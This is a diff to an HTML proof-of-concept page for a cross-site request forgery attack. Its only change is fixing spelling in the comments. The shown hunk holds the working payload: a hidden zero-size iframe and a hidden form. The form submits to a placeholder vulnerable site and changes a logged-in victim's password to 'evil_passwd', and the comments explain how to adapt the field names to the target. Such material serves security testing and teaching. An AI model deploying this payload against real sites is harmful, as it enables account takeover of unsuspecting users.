@@ -16,8 +16,8 @@
         <iframe id="iframe" name="my_iframe" style="position: absolute;width:0;height:0;border:0;"></iframe>
         <!-- CSRF - Update Password -->
         <form name="csrf" id="csrf" target="my_iframe" action="http://vulnerablewebsite.com/csrf_param.php" method="GET">
-            <input type="hidden" name="password_new" value="evil_passwd"> <!-- attribute name= modifiy according to the form present on the fulnerable website as that will be grabbed by javascript, attribue value= is holding the new password -->
-            <input type="hidden" name="password_conf" value="evil_passwd"> <!-- attribute name= modifiy according to the form present on the fulnerable website as that will be grabbed by javascript attribue value= is holding the new password -->
+            <input type="hidden" name="password_new" value="evil_passwd"> <!-- attribute name= modifiy according to the form present on the vulnerable website as that will be grabbed by javascript, attribue value= is holding the new password -->
+            <input type="hidden" name="password_conf" value="evil_passwd"> <!-- attribute name= modifiy according to the form present on the vulnerable website as that will be grabbed by javascript attribue value= is holding the new password -->
             <input type="hidden" name="action" value="change"> <!-- attribute name= modifiy according to the form present on the fulnerable website as that will be grabbed by javascript, value= attribute should be changed according to the name/value of the button on vulnerable website --> 
         </form>
         <!-- Submit form -->
